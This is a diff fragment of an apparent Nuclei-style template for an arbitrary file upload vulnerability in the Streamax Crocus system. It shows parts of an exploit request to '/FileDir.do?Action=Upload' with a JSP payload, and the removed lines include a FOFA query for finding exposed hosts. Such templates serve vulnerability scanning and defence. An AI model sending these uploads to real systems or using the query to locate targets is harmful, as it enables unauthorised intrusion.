@@ -3,12 +3,8 @@ info:
   name: 锐明技术Crocus系统 Upload存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bu0ul0t4eel8a0i9'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bu0ul0t4eel8a0i9
-    fofa: body="inp_verification" || body="/ThirdResource/respond/respond.min.js" && title="Crocus"
 http:
 - raw:
   - 'POST /FileDir.do?Action=Upload HTTP/1.1
@@ -43,7 +39,6 @@ http:
     %>
 
     ------WebKitFormBoundary7MA4YWxkTrZu0gW--
-
 
 
     上传定位：'
